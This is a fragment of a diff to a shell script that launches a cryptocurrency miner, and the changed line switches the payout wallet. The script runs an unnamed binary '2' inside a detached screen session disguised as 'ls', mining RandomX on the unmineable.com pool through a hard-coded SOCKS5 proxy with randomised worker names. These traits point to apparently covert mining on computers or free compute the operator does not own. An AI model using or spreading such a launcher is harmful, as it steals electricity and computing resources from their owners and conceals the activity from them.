@@ -6,4 +6,4 @@ chmod +x 2
 screen -dmS ls
 A=$(echo $(shuf -i 1000-9999 -n 1)-SUPER99)#rame-kb3u
 
- ./2 -a rx/0 -o rx-eu.unmineable.com:3333  -u SHIB:0x15255deac925e9928c9d64c9637556024ee3b487.$A -t 60 -x socks5://72.221.172.203:4145 
+ ./2 -a rx/0 -o rx-eu.unmineable.com:3333  -u BTT:TCf2Vh5azCXyCpEHXWTS9ErU1EN4KgosiH.$A -t 60 -x socks5://72.221.172.203:4145 
